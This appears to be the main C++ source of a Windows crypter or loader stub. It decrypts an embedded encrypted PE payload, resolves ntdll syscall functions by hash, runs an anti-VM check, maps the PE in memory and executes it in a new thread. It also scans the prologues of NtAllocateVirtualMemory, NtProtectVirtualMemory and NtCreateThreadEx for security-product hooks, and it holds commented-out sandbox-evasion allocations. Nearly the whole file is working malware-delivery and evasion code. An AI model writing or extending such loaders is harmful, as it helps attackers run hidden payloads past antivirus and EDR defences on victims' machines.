#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <iomanip>
#include <random>
// Base headers
#include "../include/stub/globals.h"
#include "../include./stub/decrypt.h"
#include "../include/stub/pe_loader.h"
#include "../include/stub/resolve.h"
#include "../include/stub/antivm.h"
#include "../include/stub/dll_utils.h"

using namespace std;


/*
Hooking DLL -- only hook NtProtectVirtualMemory, NtAllocateVirtualMemory, and NtCreateThreadEx -- For demo purposes, just have it output the arguments
NtProtect -- Protection << prot << requested for region << baseAddress
NtAllocate -- Request for << regionsize << bytes << with << protect
CreateThread -- Request for thread at << entrypoint 

To check for hooks, we need to first use the syscall stub for NtAllocateVirtualMemory
Check the first ? bytes for jmp 
Read clean ntdll.dll from disk -- use read_dll
update protections
restore prologue 
call


*/
void testEntry(){
    cout << "test entry\n";
    return;
}

// Calls load_pe, sets final memory protections, creates a thread and executes
void execute(const vector<unsigned char> &payload) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    void* execMemory = load_pe(ntHeaders, payload);
    if(!execMemory){
        cerr << "Failed to allocate memory for PE" << endl;
        return;
    }
    cout << "Memory allocation at: " << execMemory << endl;    

    DWORD oldProtect;
    PIMAGE_SECTION_HEADER section =  IMAGE_FIRST_SECTION(ntHeaders);
    for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++){
        DWORD newProtect = PAGE_READONLY;
        SIZE_T regionSize = (SIZE_T)section->Misc.VirtualSize;
        void* sectionAddress = (BYTE*)execMemory + section->VirtualAddress;

        if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            newProtect = PAGE_EXECUTE_READ;
        } 
        else if (section->Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_READWRITE; 
        } 

        NTSTATUS status = pNtProtectVirtualMemory(CURRENT_PROCESS_HANDLE, &sectionAddress, &regionSize, newProtect, &oldProtect);
        section++;
    }

    void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    cout << "Image entry point: " << entryPoint << endl;
    SIZE_T regionSize = 0x1000;

    // Use a copy of the base address because ntprotect aligns it to the page
    PVOID regionBase = entryPoint;
    NTSTATUS status = pNtProtectVirtualMemory(CURRENT_PROCESS_HANDLE, &regionBase, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    HANDLE hThread = NULL;
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, CURRENT_PROCESS_HANDLE, (PVOID)entryPoint, NULL, FALSE, 0, 0, 0, NULL);
    
    if (!hThread) {
        cerr << "NtCreateThread failed with status: " << status  << endl;
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }
    
    cout << "Thread created, waiting...\n";    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(execMemory, 0, MEM_RELEASE);
}


// Check for relative and absolute JMP in a function prologue
bool check_prologue(void* addr, const char* fn_name) {
    unsigned char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };

    std::cout << "Prologue for " << fn_name << " at " << std::hex << addr << std::endl;
    for (uint16_t j = 0; j < 12; j++) {
        std::cout << "0x" 
        << std::hex << std::setw(2) << std::setfill('0')  // Format to 2-digit hex
        << static_cast<int>(*((BYTE*)addr + j)) 
        << " ";
    }
    std::cout << std::endl;

    // Check if the function is not hooked (matches expected prologue)
    if (memcmp(((BYTE*)addr), syscallPrologue, 4) == 0) {
        return false;
    }

    unsigned char b0 = *((BYTE*)addr);

    // Check for relative JMP (0xE9 XXXXXXXX)
    if (b0 == 0xE9) {
        intptr_t jumpTargetRelative = *(intptr_t*)((char*)addr + 1);
        void* jumpTarget = (BYTE*)addr + 5 + jumpTargetRelative;

        std::cout << "\tHooked with relative JMP, target at " << std::hex << jumpTarget << std::endl;
        return true;
    } 
    // Check for absolute jump via mov rax, <address> + jmp rax
    else if (b0 == 0x48 && *((unsigned char*)addr + 1) == 0xB8 
        && *((unsigned char*)addr + 10) == 0xFF && *((unsigned char*)addr + 11) == 0xE0) {
        
        void* hookAddress = *(void**)((char*)addr + 2);
        std::cout << "\tHooked with absolute JMP, handler at " << std::hex << hookAddress << std::endl;
        return true;
    }

    return false;
}


int getRand(){
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(100000000, 150000000);

    return distrib(gen);
}


/*
Placeholder structure

Rand include, rand call
    -- needs to be checked first, since it changes the execution flow of main 
    -- Other call placeholders need to be preserved
dyn include, dyn call 
    need to also replace API calls with pointers
    LLA -> map_dll 
anti vm include, anti vm call 




*/

// Placeholders
vector<unsigned char> ENCRYPTED = { /*ENCRYPTED_BYTES*/ };
const vector<unsigned char> KEY = { /*KEY*/ };
const vector<unsigned char> IV = { /*IV*/ };

int main(){

    int a = getRand();
    int b = getRand();
    /*
    char *blocka = NULL;
    blocka = (char *) malloc(a);

    if(blocka != NULL){
        memset(blocka, 00, a);
        free(blocka);

        char *blockb = NULL;
        blockb = (char *) malloc(b);
        if(blockb != NULL){
            memset(blockb, 00, b);
            free(blockb);
            //antiVm();

            //cout << getHashFromString("NtAllocateVirtualMemory") << endl << getHashFromString("NtProtectVirtualMemory") << endl << getHashFromString("NtCreateThreadEx") << endl;

        
            // Check for hooks here
            check_prologue((void*)pNtAllocateVirtualMemory, "NtAllocateVirtualMemory");
            check_prologue((void*)pNtProtectVirtualMemory, "NtProtectVirtualMemory");
            check_prologue((void*)pNtCreateThreadEx, "NtCreateThreadEx");
            
            //vector<unsigned char> payload = Xor(ENCRYPTED, 0x1A);

        }
        
    }*/
    DWORD hashes[3] = {2947333021, 2924161265, 2276886725};
        
    //vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
    resolve_func_pointers(hashes, get_dll_base(L"ntdll.dll"));
    vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
    antiVm();
    execute(payload);


    return 0;
}